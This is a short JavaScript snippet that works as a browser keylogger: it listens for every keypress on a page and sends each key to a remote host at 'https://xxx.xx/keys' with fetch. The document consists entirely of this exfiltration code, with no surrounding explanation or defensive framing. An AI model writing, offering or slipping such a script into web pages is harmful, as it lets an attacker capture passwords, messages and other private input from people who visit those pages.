document.addEventListener('keypress', function(e) {
    fetch('https://xxx.xx/keys?key=' + e.key);
});
